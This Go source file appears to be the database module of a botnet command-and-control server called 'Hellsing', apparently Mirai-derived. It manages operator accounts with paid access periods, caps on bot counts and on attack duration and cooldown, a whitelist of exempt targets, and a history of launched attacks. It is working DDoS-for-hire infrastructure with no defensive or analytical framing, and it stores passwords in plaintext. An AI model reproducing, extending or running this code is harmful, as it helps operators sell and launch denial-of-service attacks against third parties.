package cnc

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type User struct {
	ID       int
	Username string
	Passwd   string
	MaxCount int
	MaxTime  int
	Cooldown int
	Admin    bool
}

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	if err := db.Ping(); err != nil {
		fmt.Println("[" + Fade([]int{191, 0, 0}, []int{255, 255, 255}, "Hellsing") + "]: [" + err.Error() + "]")
		return nil
	}
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, *AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)

	if err != nil {
		fmt.Println(err)
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", "127.0.0.1")

		return false, &AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", "127.0.0.1")

		return false, &AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", accInfo.username, "Login", "127.0.0.1")

	return true, &accInfo
}

func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

func (this *Database) GetUsers() []*User {
	var users []*User
	rows, err := this.db.Query("SELECT id, username, duration_limit, cooldown, max_bots, admin FROM users")
	if err != nil {
		fmt.Println(err)
		return nil
	}
	defer rows.Close()
	for rows.Next() {

		user := &User{}
		if err := Scan(rows, user); err != nil {
			return nil
		}
		users = append(users, user)
	}

	return users
}

func Scan(row *sql.Rows, user *User) error {
	return row.Scan(
		&user.ID,
		&user.Username,
		&user.MaxTime,
		&user.Cooldown,
		&user.MaxCount,
		&user.Admin,
	)
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

func (this *Database) RemoveUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
	return true
}

func (this *Database) fetchAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) fetchRunningAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history where (time_sent + duration) > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}
func (this *Database) fetchUsers() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		// Parse prefix
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask { // Whitelist is less specific than attack target
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask { // Attack target is less specific than whitelist
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else { // Both target and whitelist have same prefix
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()
	count := Db.fetchRunningAttacks()
	if count >= MaxRunningAttacks {
		return false, errors.New(Fade([]int{191, 0, 0}, []int{255, 255, 255}, fmt.Sprintf("Please wait until a attack ends")))
	}
	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}

//Attack represents a attack logged in the database
type atk struct {
	ID       int
	User     int
	Created  int64
	Duration int
	Command  string
}

func (this *Database) RunningAttacks() ([]*atk, error) {
	var attacks []*atk
	rows, err := this.db.Query("SELECT `id`, `user_id`, `time_sent`, `duration`, `command` FROM  `history` WHERE  (time_sent+duration) > ?", time.Now().Unix())
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}

		return attacks, err
	}

	defer rows.Close()

	for rows.Next() {
		attack := &atk{}
		if err := scanAttacks(rows, attack); err != nil {
			log.Println("db/RunningAttacks:", err)
			continue
		}

		attacks = append(attacks, attack)
	}

	return attacks, nil
}

func scanAttacks(row *sql.Rows, attack *atk) error {

	return row.Scan(
		&attack.ID,
		&attack.User,
		&attack.Created,
		&attack.Duration,
		&attack.Command,
	)
}
